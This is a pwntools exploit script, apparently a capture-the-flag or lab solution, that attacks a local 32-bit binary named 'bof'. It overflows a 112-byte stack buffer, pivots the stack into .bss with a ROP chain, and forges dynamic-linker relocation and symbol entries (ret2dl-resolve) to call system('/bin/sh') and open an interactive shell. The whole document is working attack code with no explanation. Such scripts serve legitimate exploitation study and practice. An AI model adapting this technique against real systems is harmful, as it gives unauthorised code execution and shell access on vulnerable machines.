from pwn import *

io = process('./bof')
elf = ELF('./bof')

read_plt = elf.plt['read']
write_got = elf.got['write']
ppp_ret = 0x08048619
bss_addr = 0x0804a040
dynsym_addr = 0x080481d8
dynstr_addr = 0x08048278
rel_plt_addr = 0x08048330 
base_stage = bss_addr + 0x800
pop_ebp_ret = 0x0804861b
leave_ret = 0x0804851d

payload = 'A' * 112
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
io.sendline(payload)

plt_0 = 0x08048380
st_name  = base_stage + 80 - dynstr_addr
fake_reloc_addr = base_stage + 20
fake_sym_addr = base_stage + 28

reloc_index = fake_reloc_addr - rel_plt_addr
align = 0x10 - ((fake_sym_addr - dynsym_addr) & 0xf)
fake_sym_addr += align 
dynsym_index = (fake_sym_addr - dynsym_addr) / 0x10
r_info = dynsym_index << 8 | 0x7
fake_reloc = p32(write_got) + p32(r_info)
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
sh_addr = fake_sym_addr + 0x10

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(reloc_index)
payload2 += 'AAAA'
payload2 += p32(sh_addr)
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += '/bin/sh' + '\x00'
payload2 += (80 - len(payload2)) * 'A'
payload2 += 'system' + '\x00'
payload2 += (100 - len(payload2)) * 'A'
io.sendline(payload2)

io.interactive()
